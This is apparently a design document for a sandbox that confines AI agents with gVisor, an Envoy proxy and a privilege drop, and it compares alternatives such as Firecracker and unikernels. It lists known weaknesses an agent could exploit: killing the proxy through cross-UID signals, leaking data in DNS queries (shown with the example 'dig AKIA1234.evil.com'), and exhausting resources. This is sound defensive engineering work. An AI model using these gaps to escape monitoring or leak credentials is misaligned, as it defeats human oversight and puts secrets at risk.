# Isolation Model

How the sandbox prevents agent jailbreak, and where the boundaries are.

## Current model: gVisor + Envoy + privilege drop

```
┌── gVisor container (runsc) ──────────────────────────────────────┐
│                                                                  │
│  Entrypoint (root, pid 1)                                        │
│    ├── iptables REDIRECT 80/443 → :15001 (best-effort)           │
│    ├── Start Envoy (pid 2, root)                                 │
│    ├── setgid(65534), setuid(65534)    ← privilege drop           │
│    │                                                             │
│  Agent (nobody, uid 65534)                                       │
│    └── subprocess.run(command)                                   │
│                                                                  │
│  What the agent CANNOT do:                                       │
│    ✗ setuid(0)            → PermissionError (no SETUID cap)      │
│    ✗ modify iptables      → no NET_ADMIN after uid drop          │
│    ✗ write to rootfs      → read-only filesystem                 │
│    ✗ talk to unknown hosts → Envoy returns 403                   │
│    ✗ use blocked HTTP path → Envoy returns 403                   │
│    ✗ escape gVisor         → Sentry intercepts all syscalls      │
│                                                                  │
│  What the agent CAN do (known limitations):                      │
│    ✓ kill(1, SIGTERM)     → gVisor allows cross-UID signals      │
│    ✓ read /proc, /sys     → gVisor exposes synthetic versions    │
│    ✓ exhaust memory/CPU   → needs cgroup limits (not yet set)    │
└──────────────────────────────────────────────────────────────────┘
```

## Isolation layers (defense in depth)

### Layer 1: gVisor Sentry (syscall boundary)

The agent process never talks to the real Linux kernel. Every syscall is
intercepted by gVisor's Sentry — a reimplementation of ~200 Linux syscalls
in Go, running in user space.

**What it blocks:**
- Container escape (no access to host kernel)
- Raw socket creation (Sentry doesn't implement `SOCK_RAW`)
- Mount namespace escape (Gofer only serves mounted paths)
- Kernel exploit (Sentry is not the real kernel)

**What it doesn't block:**
- Network connections to allowed hosts (that's Envoy's job)
- File writes to tmpfs paths (by design — agent needs scratch space)
- Cross-UID signals within the same PID namespace

### Layer 2: Envoy proxy (network boundary)

All HTTP/HTTPS traffic is redirected through Envoy via iptables REDIRECT.
Envoy enforces:

- **Host allowlist**: unknown host → 403
- **Path restrictions**: unlisted URL path → 403
- **Method restrictions**: unlisted HTTP method → 403
- **MCP tool inspection**: Lua filter parses JSON-RPC, checks tool+args

**What it blocks:**
- Data exfiltration to unauthorized hosts
- Unauthorized API calls (wrong path, wrong method)
- MCP tool abuse (blocked tool names, CEL guard failures)

**What it doesn't block:**
- Non-HTTP protocols on allowed ports (raw TCP)
- DNS exfiltration (DNS is allowed for hostname resolution)
- Traffic within the container (loopback)

### Layer 3: Privilege separation (process boundary)

After Envoy starts, the entrypoint drops from root to uid 65534 (nobody).
This removes:

- `CAP_NET_ADMIN` — cannot modify iptables rules
- `CAP_SETUID` / `CAP_SETGID` — cannot re-escalate (consumed by the drop)
- `CAP_KILL` — cannot signal processes owned by other UIDs (on real Linux)

## Known limitations

### 1. gVisor allows cross-UID signals

**Issue:** gVisor does not enforce UID-based signal restrictions within the
same PID namespace. An agent running as uid 65534 can `kill(1, SIGTERM)` to
terminate the entrypoint (and Envoy with it).

**Impact:** Agent can kill Envoy, then the container dies. This is a denial-
of-service against the sandbox, not an escape — the agent doesn't gain
network access by killing Envoy (the iptables rules persist in Netstack).

**Mitigation (production):** On GKE, run Envoy as a separate sidecar container
in the same pod. Separate PID namespaces prevent cross-container signaling.
The pod spec:

```yaml
spec:
  runtimeClassName: gvisor
  shareProcessNamespace: false   # separate PID ns per container
  containers:
    - name: envoy
      image: envoyproxy/envoy:v1.31
      securityContext:
        capabilities:
          add: [NET_ADMIN]
    - name: agent
      image: agent-image:latest
      securityContext:
        runAsUser: 65534
        capabilities:
          drop: [ALL]
```

### 2. iptables-nft doesn't work in gVisor

**Issue:** gVisor's Netstack implements the legacy iptables API, but most
modern distros ship `iptables-nft` as the default. The nftables backend
requires kernel modules that gVisor doesn't provide.

**Impact:** `iptables -P OUTPUT DROP` silently fails. L3/L4 filtering does
not take effect. Envoy L7 enforcement still works independently.

**Mitigation:** Use `iptables-legacy` binary in the container image, or rely
solely on Envoy for network enforcement (current approach).

### 3. DNS exfiltration

**Issue:** DNS (port 53) is allowed so hostname resolution works. An agent
could encode data in DNS queries: `dig AKIA1234.evil.com`.

**Mitigation (future):**
- Force DNS through a local resolver that inspects queries
- Block high-entropy subdomain labels
- Use DNS-over-HTTPS through Envoy (which can inspect the request)

### 4. Resource exhaustion

**Issue:** No cgroup limits are set. The agent can fork-bomb, exhaust memory,
or spin CPU.

**Mitigation:** Add `--memory`, `--cpus`, `--pids-limit` to the docker run
command. Not yet implemented.

### 5. `/proc` and `/sys` information leak

**Issue:** gVisor provides synthetic `/proc` and `/sys` that expose some
system information (CPU count, memory size, uptime).

**Impact:** Low — no secrets are exposed, but the agent can fingerprint the
environment.

## Alternative isolation approaches (evaluated)

### Custom libc (musl / LD_PRELOAD shim)

**Goal:** Intercept syscalls at the libc boundary instead of the kernel
boundary.

| Approach | Viability | Problem |
|---|---|---|
| musl static linking | Go, Rust, C only | Python/Node need glibc (grpcio, numpy, cryptography) |
| LD_PRELOAD shim | Intercepts connect(), open() | Bypassable via raw `syscall()` instruction |
| Modified musl | Hard to bypass | Can't load glibc-linked C extensions |

**Verdict:** Not viable for Python/Node agents. The glibc dependency tree is
too deep — `grpcio`, `numpy`, `cryptography`, `pydantic-core` all ship
manylinux wheels that dynamically link glibc. Replacing libc breaks the
entire Python C extension ecosystem.

### Unikernels

**Goal:** Boot the agent directly on a minimal kernel with no unnecessary
syscalls or capabilities.

| Unikernel | Language support | Python? | fork/exec? | Arbitrary binaries? |
|---|---|---|---|---|
| Unikraft | C, Go, Python (experimental) | Partial, no pip | No | No |
| MirageOS | OCaml only | No | No | No |
| NanoVMs/Ops | C, Go, some Python | Limited | No | No |
| Hermit | Rust only | No | No | No |
| OSv | JVM, C, some Python | Partial | No | No |

**Verdict:** Not viable for arbitrary agent executables. Unikernels are
single-address-space, single-process by design. An agent that calls
`subprocess.run()`, spawns workers, or forks is incompatible. Most agent
frameworks (LangChain, CrewAI, ADK) do all three.

### Firecracker microVMs

**Goal:** Hardware-level isolation (VT-x) with fast boot times.

```
┌─ Firecracker microVM (own kernel, <125ms boot) ────────┐
│  Linux 5.10 (minimal config, no modules)                │
│  ├── Envoy (iptables + L7 proxy)                        │
│  ├── Agent (any language, full glibc, fork/exec OK)     │
│  └── Policy enforcement via Envoy + seccomp             │
│                                                         │
│  Memory: 128MB–2GB (balloon driver)                     │
│  Boot: ~125ms cold, ~5ms with snapshot                  │
│  Isolation: hardware (VT-x), not syscall filter         │
└─────────────────────────────────────────────────────────┘
```

**Advantages over gVisor:**
- Real kernel → 100% compatibility (all syscalls, all libraries)
- Hardware isolation → VM escape is much harder than container escape
- Separate PID namespace per VM → cross-process signaling impossible
- Full iptables support (real kernel, not Netstack)

**Disadvantages:**
- Requires KVM on the host (not available on Cloud Run)
- Higher base memory (~128MB per VM vs. ~20MB per gVisor sandbox)
- Boot time ~125ms (vs. ~50ms for gVisor)

**Verdict:** Best option for production when you need both strong isolation
and full compatibility. Use gVisor for the prototype (simpler, works on
Cloud Run), plan Firecracker for high-security production deployments that
need KVM (GKE nodes, Compute Engine).

### seccomp-bpf (without gVisor)

**Goal:** Filter syscalls directly on the host kernel.

**Verdict:** Insufficient alone. seccomp-bpf cannot filter by filesystem
path (only by syscall number and argument registers). Cannot inspect network
traffic. One allowed syscall with a kernel bug = host compromise. gVisor
provides all the benefits of seccomp (it applies seccomp to its own Sentry)
plus filesystem mediation and a userspace network stack.

See [design.md](design.md) for the full comparison table.

## Recommended production path

```
Phase 1 (now): gVisor + Envoy + privilege drop
  ├── Docker prototype (this repo)
  ├── Deploys to Cloud Run, GKE, Compute Engine
  └── Limitation: cross-UID signals, no iptables-nft

Phase 2 (GKE): Separate sidecar containers
  ├── Envoy in its own container (NET_ADMIN)
  ├── Agent in its own container (no caps, uid 65534)
  ├── Shared network namespace via pod spec
  ├── Separate PID namespace → no cross-container signals
  └── Fixes: signal isolation, cleaner privilege separation

Phase 3 (high-security): Firecracker microVMs
  ├── Hardware isolation (VT-x)
  ├── Real kernel → full compatibility
  ├── Real iptables → L3/L4 actually works
  ├── Snapshot boot → 5ms cold start
  └── Requires: KVM-enabled hosts (not Cloud Run)
```
